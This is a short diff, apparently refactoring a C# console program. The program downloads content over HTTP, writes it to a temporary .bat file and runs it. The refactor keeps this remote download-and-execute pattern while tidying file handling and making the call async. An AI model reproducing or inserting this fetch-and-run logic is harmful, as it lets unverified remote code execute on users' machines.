@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net.Http;
 using System.IO;
 using System.Diagnostics;
@@ -19,10 +19,11 @@ class Program {
             Console.WriteLine($"Error while fetching content: {e.Message}");
             return;
         }
-        StreamWriter sw = new StreamWriter($"{System.IO.Path.GetTempPath()}\\BatchFileToRun.bat");
-        sw.WriteLine(body);
-        sw.Close();
-        ExecuteCommand($"{System.IO.Path.GetTempPath()}\\BatchFileToRun.bat");
+        string filePath = $"{System.IO.Path.GetTempPath()}\\BatchFileToRun.bat";
+        using (StreamWriter sw = new StreamWriter(filePath)) {
+            sw.WriteLine(body);
+        }
+        await ExecuteCommandAsync(filePath);
     }
 
     public static void ExecuteCommand(string command) {
